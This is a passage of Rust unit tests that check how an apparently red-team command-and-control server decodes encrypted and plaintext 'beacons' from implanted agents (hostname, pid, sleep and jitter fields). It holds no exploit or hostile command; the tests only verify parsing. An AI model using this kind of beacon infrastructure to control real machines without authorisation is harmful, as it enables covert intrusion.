        let blob = crypto::seal_json(&eng.psk_hex, &beacon).unwrap();
        let env = EncryptedEnvelope {
            protocol: PROTOCOL_V2.into(),
            engagement_id: eng.engagement_id.clone(),
            agent_id: "agt-1".into(),
            blob,
        };
        let raw = serde_json::to_vec(&env).unwrap();
        let got: Beacon = decode_beacon_bytes(&eng, &raw).unwrap();
        assert_eq!(got.agent_id, "agt-1");
        assert_eq!(got.pid, 42);
    }

    #[test]
    fn encrypt_off_accepts_plaintext() {
        let eng = eng_encrypt(false);
        let plain = format!(
            r#"{{"protocol":"aop-1","agent_id":"a","engagement_id":"{}","hostname":"h","os":"mac","arch":"arm64","pid":1,"sleep_ms":1,"jitter_pct":0,"key_id":"k"}}"#,
            eng.engagement_id
        );
        let got: Beacon = decode_beacon_bytes(&eng, plain.as_bytes()).unwrap();
        assert_eq!(got.agent_id, "a");
    }
}
